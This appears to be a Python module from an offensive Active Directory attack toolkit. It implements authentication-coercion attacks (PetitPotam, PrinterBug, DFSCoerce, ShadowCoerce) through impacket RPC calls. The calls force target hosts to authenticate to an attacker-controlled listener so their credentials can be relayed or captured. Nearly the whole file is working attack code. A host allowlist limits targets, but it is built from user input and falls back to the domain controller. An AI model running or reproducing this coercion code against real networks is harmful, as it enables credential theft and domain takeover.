"""Coercion trigger executor with explicit target allowlist.

Requires either:
  - -P allow_hosts=<host1,host2> (explicit approved targets), or
  - -P coercion_session=<prior coercion-map session dir>

Only hosts present in the allowlist may be triggered. Methods remain
PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce.
"""

from __future__ import annotations

import contextlib
import json
from pathlib import Path
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

METHODS = {
    "petitpotam": {
        "iface_uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
        "iface_version": "1.0",
        "endpoint": r"\pipe\lsarpc",
        "op": "EfsRpcOpenFileRaw",
        "note": "MS-EFSRPC 0x00 EfsRpcOpenFileRaw",
        "risk": "high",
    },
    "printerbug": {
        "iface_uuid": "12345678-1234-abcd-ef00-0123456789ab",
        "iface_version": "1.0",
        "endpoint": r"\pipe\spoolss",
        "op": "RpcRemoteFindFirstPrinterChangeNotificationEx",
        "note": "MS-RPRN spoolss abuse",
        "risk": "high",
    },
    "dfscoerce": {
        "iface_uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
        "iface_version": "3.0",
        "endpoint": r"\pipe\netdfs",
        "op": "NetrDfsAddStdRoot",
        "note": "MS-DFSNM add-std-root",
        "risk": "high",
    },
    "shadowcoerce": {
        "iface_uuid": "a8e0653c-2744-4389-a61d-7373df8b2292",
        "iface_version": "1.0",
        "endpoint": r"\pipe\FssagentRpc",
        "op": "IsPathSupported",
        "note": "MS-FSRVP shadowcoerce",
        "risk": "high",
    },
}


def _normalize_host(value: str) -> str:
    return value.strip().lower().rstrip(".")


def _load_allowlist(kwargs: dict[str, Any], fallback_host: str | None) -> list[str]:
    raw = kwargs.get("allow_hosts") or kwargs.get("hosts") or kwargs.get("approved_targets")
    hosts: list[str] = []
    if isinstance(raw, str):
        hosts.extend(h.strip() for h in raw.split(",") if h.strip())
    elif isinstance(raw, list):
        hosts.extend(str(h).strip() for h in raw if str(h).strip())

    coercion_session = kwargs.get("coercion_session") or kwargs.get("map_session")
    if coercion_session:
        path = Path(str(coercion_session)).expanduser()
        map_file = path / "coercion-map.json" if path.is_dir() else path
        if map_file.is_file():
            data = json.loads(map_file.read_text(encoding="utf-8"))
            for row in data.get("hosts") or []:
                if row.get("spooler") or row.get("efsrpc"):
                    host = row.get("host") or row.get("dns") or row.get("sam")
                    if host:
                        hosts.append(str(host))

    # Single-host shorthand still allowed, but must appear in allowlist construction
    explicit_host = kwargs.get("host")
    if explicit_host and not hosts:
        hosts.append(str(explicit_host))
    elif fallback_host and not hosts:
        # No allowlist source at all — reject later
        hosts.append(fallback_host)

    # De-dupe preserving order
    seen: set[str] = set()
    ordered: list[str] = []
    for h in hosts:
        key = _normalize_host(h)
        if key not in seen:
            seen.add(key)
            ordered.append(h.strip())
    return ordered


def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str, Any]:
    from impacket.dcerpc.v5 import rpcrt, transport

    meta = METHODS[method]
    binding = rf"ncacn_np:{host}[{meta['endpoint']}]"
    rpc_transport = transport.DCERPCTransportFactory(binding)
    lm, nt = target.lm_nt_hashes()
    if hasattr(rpc_transport, "set_credentials"):
        rpc_transport.set_credentials(
            target.username or "",
            target.password or "",
            target.domain,
            lm,
            nt,
            target.aes_key or "",
        )
    if target.use_kerberos:
        rpc_transport.set_kerberos(True, kdcHost=target.dc_ip)
    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(rpcrt.uuidtup_to_bin((meta["iface_uuid"], meta["iface_version"])))

    listener_path = rf"\\{listener}\pwn\x"
    try:
        request = _build_coercion_request(method, listener_path)
        dce.request(request)
        return {
            "method": method,
            "host": host,
            "listener": listener_path,
            "ok": True,
            "risk": meta["risk"],
        }
    except Exception as exc:  # noqa: BLE001
        text = str(exc)
        if "STATUS_BAD_NETWORK_NAME" in text or "STATUS_NETWORK_PATH_NOT_FOUND" in text:
            return {
                "method": method,
                "host": host,
                "listener": listener_path,
                "ok": True,
                "expected_error": text[:120],
                "risk": meta["risk"],
            }
        return {
            "method": method,
            "host": host,
            "listener": listener_path,
            "ok": False,
            "error": text[:200],
            "risk": meta["risk"],
        }
    finally:
        with contextlib.suppress(Exception):
            dce.disconnect()


def _build_coercion_request(method: str, listener: str) -> Any:
    if method == "petitpotam":
        from impacket.dcerpc.v5.efsr import EfsRpcOpenFileRaw

        req = EfsRpcOpenFileRaw()
        req["FileName"] = listener + "\x00"
        req["Flag"] = 0
        return req
    if method == "printerbug":
        from impacket.dcerpc.v5.rprn import RpcRemoteFindFirstPrinterChangeNotificationEx

        req = RpcRemoteFindFirstPrinterChangeNotificationEx()
        req["pszLocalMachine"] = listener + "\x00"
        req["fdwFilter"] = 0
        req["fdwOptions"] = 0
        return req
    if method == "dfscoerce":
        from impacket.dcerpc.v5.dtypes import ULONG, WSTR
        from impacket.dcerpc.v5.ndr import NDRCALL

        class NetrDfsAddStdRoot(NDRCALL):  # type: ignore[misc]
            opnum = 12
            structure = (
                ("ServerName", WSTR),
                ("RootShare", WSTR),
                ("Comment", WSTR),
                ("ApiFlags", ULONG),
            )

        req = NetrDfsAddStdRoot()
        req["ServerName"] = listener + "\x00"
        req["RootShare"] = "share\x00"
        req["Comment"] = "\x00"
        req["ApiFlags"] = 1
        return req
    if method == "shadowcoerce":
        from impacket.dcerpc.v5.dtypes import WSTR
        from impacket.dcerpc.v5.ndr import NDRCALL

        class IsPathSupported(NDRCALL):  # type: ignore[misc]
            opnum = 8
            structure = (("ShareName", WSTR),)

        req = IsPathSupported()
        req["ShareName"] = listener + "\x00"
        return req
    raise ValueError(f"unknown method: {method}")


@register_capability(
    id="coerce",
    summary="Trigger coercion only against an approved host allowlist",
    category="credential-access",
    tags=("coerce", "petitpotam", "printerbug", "dfscoerce", "shadowcoerce", "allowlist"),
    destructive=False,
)
class Coerce:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("coerce")
        listener = kwargs.get("listener")
        methods = str(kwargs.get("methods") or "petitpotam,printerbug,dfscoerce,shadowcoerce")
        if not listener:
            raise RuntimeError("Pass -P listener=<attacker-host-or-ip>.")

        allowlist = _load_allowlist(kwargs, target.dc_ip)
        if not allowlist:
            raise RuntimeError(
                "Coercion requires an approved allowlist. Pass "
                "-P allow_hosts=<h1,h2> or -P coercion_session=<coercion-map session dir>."
            )

        # Optional single-host filter must still be inside allowlist
        requested_host = kwargs.get("host")
        if requested_host:
            if _normalize_host(str(requested_host)) not in {_normalize_host(h) for h in allowlist}:
                raise RuntimeError(
                    f"Host {requested_host} is not in the approved allowlist: {allowlist}"
                )
            targets = [str(requested_host)]
        else:
            targets = allowlist

        chosen = [m.strip() for m in methods.split(",") if m.strip() in METHODS]
        console.print(f"[bold]coerce[/bold] targets={targets} listener={listener} methods={chosen}")
        console.print(f"  allowlist size={len(allowlist)}  risk=high (authentication coercion)")

        results: list[dict[str, Any]] = []
        for host in targets:
            for method in chosen:
                outcome = _trigger(target, host, str(listener), method)
                status = "ok" if outcome.get("ok") else "fail"
                console.print(f"  {host} / {method}: {status}")
                results.append(outcome)
                if outcome.get("ok"):
                    node = f"COMPUTER@{host.upper()}@{target.domain.upper()}"
                    graph.add_node(node, "Computer", host=host)
                    graph.add_edge(node, node, "CoercionTriggered", method=method)

        payload = {
            "listener": listener,
            "allowlist": allowlist,
            "targets": targets,
            "methods": chosen,
            "results": results,
            "successes": sum(1 for r in results if r.get("ok")),
        }
        out = session.path("coerce.json")
        out.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "coerce.complete",
            listener=listener,
            targets=len(targets),
            success=payload["successes"],
        )
        console.print(f"[green]Done[/green]  successes={payload['successes']}")
        return payload
